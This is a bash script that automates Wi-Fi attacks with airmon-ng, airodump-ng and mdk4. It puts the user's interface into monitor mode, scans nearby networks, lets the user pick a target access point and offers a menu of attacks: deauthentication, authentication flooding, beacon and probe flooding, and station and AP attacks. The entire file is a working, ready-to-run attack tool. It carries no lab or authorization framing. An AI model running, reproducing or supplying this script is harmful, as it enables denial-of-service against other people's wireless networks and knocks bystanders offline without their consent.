#!/bin/bash
# Fixed MDK4 Script for Wi-Fi Network Attacks using aircrack-ng suite

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Global arrays for networks
declare -a NETWORK_MACS
declare -a NETWORK_SSIDS

# Function to print colored output
print_status() { echo -e "${GREEN}[+]${NC} $1" >&2; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1" >&2; }
print_error() { echo -e "${RED}[-]${NC} $1" >&2; }

# Function to check if required tools are installed
check_dependencies() {
    missing_tools=()
    for tool in airmon-ng airodump-ng mdk4; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -ne 0 ]; then
        print_error "Missing required tools: ${missing_tools[*]}"
        print_warning "Please install them with your package manager:"
        echo "sudo apt install aircrack-ng mdk4" >&2
        exit 1
    fi
}

# Function to set interface to monitor mode using airmon-ng
set_monitor_mode() {
    interface=$1
    
    # Check if interface exists
    if ! ip link show "$interface" &>/dev/null; then
        print_error "Interface $interface does not exist!"
        return 1
    fi
    
    # Check if already in monitor mode
    if [[ "$interface" == *mon ]]; then
        print_status "$interface appears to already be in monitor mode"
        echo "$interface"
        return 0
    fi
    
    # Kill interfering processes
    print_warning "Killing interfering processes..."
    sudo airmon-ng check kill >/dev/null 2>&1
    
    # Set monitor mode
    print_warning "Setting $interface to monitor mode..."
    sudo airmon-ng start "$interface" >/dev/null 2>&1
    
    # Give it a moment to settle
    sleep 2
    
    # Find the monitor interface name
    monitor_interface="${interface}mon"
    
    # Check if the monitor interface was created
    if ip link show "$monitor_interface" &>/dev/null; then
        print_status "Monitor interface created: $monitor_interface"
        echo "$monitor_interface"
        return 0
    else
        # Sometimes airmon-ng creates a different name like mon0
        mon_interfaces=$(ip link show | grep -oE 'mon[0-9]+' | head -1)
        if [ -n "$mon_interfaces" ]; then
            print_status "Monitor interface created: $mon_interfaces"
            echo "$mon_interfaces"
            return 0
        fi
        
        # Check if the original interface changed mode
        mode_info=$(iwconfig "$interface" 2>/dev/null | grep "Mode:")
        if [[ "$mode_info" == *"Monitor"* ]]; then
            print_status "$interface is now in monitor mode"
            echo "$interface"
            return 0
        fi
        
        print_error "Failed to create monitor interface"
        return 1
    fi
}

# Function to scan for networks using airodump-ng
scan_networks() {
    interface=$1
    print_status "Scanning for Wi-Fi networks for 15 seconds..."
    
    # Create a temporary file for capture
    temp_base="/tmp/airodump_scan_$$"
    
    # Start airodump-ng for 15 seconds to capture network data
    sudo timeout 15s airodump-ng --output-format csv -w "$temp_base" "$interface" >/dev/null 2>&1
    
    # Process the CSV file
    csv_file="${temp_base}-01.csv"
    
    if [ ! -f "$csv_file" ]; then
        rm -f "${temp_base}"* 2>/dev/null
        return 1
    fi
    
    # Clear global arrays
    NETWORK_MACS=()
    NETWORK_SSIDS=()
    
    # Process the CSV file - skip header lines
    in_stations_section=false
    
    while IFS= read -r line; do
        # Skip empty lines
        if [ -z "$(echo "$line" | tr -d ' ')" ]; then
            continue
        fi
        
        # Check if we've reached the stations section
        if [[ "$line" == "Station MAC"* ]]; then
            break
        fi
        
        # Skip header lines
        if [[ "$line" == "BSSID"* ]] || [[ "$line" == "Station MAC"* ]]; then
            continue
        fi
        
        # Extract MAC and SSID (comma separated)
        # Format: BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
        mac=$(echo "$line" | cut -d',' -f1 | tr -d ' ')
        ssid=$(echo "$line" | cut -d',' -f14 | sed 's/^ *//;s/ *$//' | tr -d '"')
        
        # Only add if both MAC and SSID exist and SSID is not empty
        if [ -n "$mac" ] && [ -n "$ssid" ] && [ "$ssid" != "" ] && [[ $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            NETWORK_MACS+=("$mac")
            NETWORK_SSIDS+=("$ssid")
        fi
    done < "$csv_file"
    
    # Clean up temporary files
    rm -f "${temp_base}"* 2>/dev/null
    
    # Return success if we found networks
    if [ ${#NETWORK_MACS[@]} -gt 0 ]; then
        return 0
    else
        return 1
    fi
}

# Function to validate MAC address
is_valid_mac() {
    mac=$1
    if [[ $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Function to display menu
show_menu() {
    echo "=====================================" >&2
    echo "MDK4 Attack Options" >&2
    echo "=====================================" >&2
    echo "1) Deauthentication Attack (mdk4 d -B)" >&2
    echo "2) Authentication Attack (mdk4 a -a)" >&2
    echo "3) Beacon Flooding (mdk4 b)" >&2
    echo "4) Probe Request Flooding (mdk4 p)" >&2
    echo "5) Station Attack (mdk4 s -B)" >&2
    echo "6) AP Attack (mdk4 a)" >&2
    echo "0) Exit" >&2
    echo "=====================================" >&2
}

# Function to run attacks with correct MDK4 syntax
run_attack() {
    interface=$1
    attack_type=$2
    target_mac=$3
    target_ssid=$4
    
    case $attack_type in
        1) # Deauthentication Attack - correct syntax
            print_status "Starting Deauthentication attack on $target_mac..."
            print_warning "Press Ctrl+C to stop"
            sudo mdk4 "$interface" d -B "$target_mac"
            ;;
        2) # Authentication Attack
            print_status "Starting Authentication attack on $target_mac..."
            print_warning "Press Ctrl+C to stop"
            sudo mdk4 "$interface" a -a "$target_mac"
            ;;
        3) # Beacon Flooding
            print_status "Starting Beacon Flooding..."
            print_warning "Press Ctrl+C to stop"
            sudo mdk4 "$interface" b
            ;;
        4) # Probe Request Flooding
            print_status "Starting Probe Request Flooding..."
            print_warning "Press Ctrl+C to stop"
            sudo mdk4 "$interface" p
            ;;
        5) # Station Attack - correct syntax
            print_status "Starting Station Attack on $target_mac..."
            print_warning "Press Ctrl+C to stop"
            sudo mdk4 "$interface" s -B "$target_mac"
            ;;
        6) # AP Attack
            print_status "Starting AP Attack..."
            print_warning "Press Ctrl+C to stop"
            sudo mdk4 "$interface" a
            ;;
        *) # Invalid option
            print_warning "Invalid attack type!" >&2
            ;;
    esac
}

# Function to clean up on exit
cleanup() {
    if [ -n "$MONITOR_INTERFACE" ] && [ "$MONITOR_INTERFACE" != "$ORIGINAL_INTERFACE" ]; then
        print_status "Stopping monitor mode on $MONITOR_INTERFACE..."
        sudo airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi
    
    # Restart network manager if we killed it
    if command -v NetworkManager &>/dev/null; then
        sudo systemctl start NetworkManager >/dev/null 2>&1
    elif command -v networking &>/dev/null; then
        sudo systemctl start networking >/dev/null 2>&1
    fi
    
    rm -f /tmp/airodump_scan_* 2>/dev/null
    tput cnorm 2>/dev/null # Show cursor
    print_status "Cleaned up and restored network services"
}
trap cleanup EXIT

# Main function
main() {
    tput civis 2>/dev/null # Hide cursor during scanning
    
    # Check dependencies
    check_dependencies
    
    # Get interface from user or parameter
    if [ -n "$1" ]; then
        ORIGINAL_INTERFACE="$1"
    else
        read -rp "Enter your interface (e.g., wlan0): " ORIGINAL_INTERFACE </dev/tty >&2
    fi
    
    if [ -z "$ORIGINAL_INTERFACE" ]; then
        print_error "No interface specified!"
        exit 1
    fi
    
    # Set monitor mode
    MONITOR_INTERFACE=$(set_monitor_mode "$ORIGINAL_INTERFACE")
    if [ $? -ne 0 ] || [ -z "$MONITOR_INTERFACE" ]; then
        print_error "Failed to set monitor mode"
        exit 1
    fi
    
    # Scan for networks
    print_status "Scanning for networks..."
    if ! scan_networks "$MONITOR_INTERFACE"; then
        print_error "No networks found. This could be due to:"
        echo "  - No visible Wi-Fi networks in range" >&2
        echo "  - Interface not properly set to monitor mode" >&2
        echo "  - Hardware/driver limitations" >&2
        exit 1
    fi
    
    # Check if we found any networks
    if [ ${#NETWORK_MACS[@]} -eq 0 ]; then
        print_error "No networks with visible SSIDs found"
        exit 1
    fi
    
    # Display networks
    echo >&2
    print_status "Available Wi-Fi Networks:" >&2
    for i in "${!NETWORK_SSIDS[@]}"; do
        printf "%2d) %s (%s)\n" "$i" "${NETWORK_SSIDS[i]}" "${NETWORK_MACS[i]}" >&2
    done
    
    echo >&2
    # Get user choice with validation
    while true; do
        read -rp "Choose the number of your target network (0-$(( ${#NETWORK_SSIDS[@]} - 1 ))): " network_number </dev/tty >&2
        
        if [[ "$network_number" =~ ^[0-9]+$ ]] && [ "$network_number" -lt "${#NETWORK_SSIDS[@]}" ]; then
            break
        else
            print_warning "Invalid selection! Please choose a number between 0 and $(( ${#NETWORK_SSIDS[@]} - 1 ))" >&2
        fi
    done
    
    # Set target information
    TARGET_SSID="${NETWORK_SSIDS[$network_number]}"
    TARGET_MAC="${NETWORK_MACS[$network_number]}"
    
    print_status "Selected network: $TARGET_SSID ($TARGET_MAC)" >&2
    echo >&2
    
    # Main attack loop
    while true; do
        show_menu
        read -rp "Choose an attack (0-6): " attack_choice </dev/tty >&2
        
        case $attack_choice in
            0) # Exit
                print_status "Exiting..."
                exit 0
                ;;
            [1-6]) # Valid attacks
                run_attack "$MONITOR_INTERFACE" "$attack_choice" "$TARGET_MAC" "$TARGET_SSID"
                echo >&2
                print_status "Attack finished. Press any key to continue..." >&2
                read -rn 1 </dev/tty >&2
                clear >&2
                ;;
            *) # Invalid option
                print_warning "Invalid option. Please try again." >&2
                ;;
        esac
    done
}

# Run main function with all arguments passed
main "$@"
